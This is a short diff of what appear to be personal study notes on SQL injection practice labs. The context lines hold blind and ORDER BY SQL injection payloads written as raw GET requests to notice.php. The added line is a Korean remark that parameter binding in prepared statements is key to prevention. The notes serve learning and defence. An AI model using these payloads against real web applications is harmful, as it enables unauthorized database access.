@@ -76,3 +76,5 @@ sas%' and ascii(substring(user(),1,1))>104  and '%1%'='%1 -> i
 GET /exam7/notice.php?pageIndex=1&board_id=&sorting=title&sotingAd=DESC,case+when+1=1+then+1+else+(select+1+union+select+2)+end&startDt=&endDt=&searchType=all&keyword= HTTP/1.1
 GET /exam12/notice.php?pageIndex=1&board_id=&sorting=&sotingAd=DESC&startDt=20231001&endDt=20231031+and+user()user()+and+1=1 &searchType=all&keyword= HTTP/1.1
 
+
+sql을 예방하기 위한 방법인 prepared statement 중 parse bind execute fetch 단계에서 bind 부분이 가장 중요함 < 더 공부하기
